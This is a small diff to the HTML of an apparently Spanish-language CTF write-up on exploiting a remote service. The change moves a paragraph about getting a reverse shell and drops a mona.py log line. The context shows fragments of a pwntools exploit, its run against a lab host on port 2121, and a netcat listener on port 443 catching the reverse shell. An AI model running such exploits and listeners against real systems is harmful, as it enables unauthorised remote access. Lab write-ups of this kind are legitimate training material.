@@ -226,7 +226,6 @@ Hold on...
 [+] Command used:
 !py C:\Users\user\Documents\WinDbgX\x86\mona.py modules
 
----------- Mona command started on 2024-12-31 18:39:02 (v2.0, rev 636) ----------
 [+] Processing arguments and criteria
     - Pointer access level : X
 [+] Generating module info table, hang on...
@@ -1119,6 +1118,7 @@ shell.sendline(</span><span class="no">b</span><span class="s">"TEST "</span><sp
 shell.interactive()</span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Finalmente al ejecutar nuestro exploit de forma remota obtenemos una reverse shell</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
 [</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.122.10 on port 2121: Done  
@@ -1126,7 +1126,6 @@ shell.interactive()</span>
 </span><span class="ro">$</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Finalmente al ejecutar nuestro exploit de forma remota obtenemos una reverse shell</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
 Listening on 0.0.0.0 443
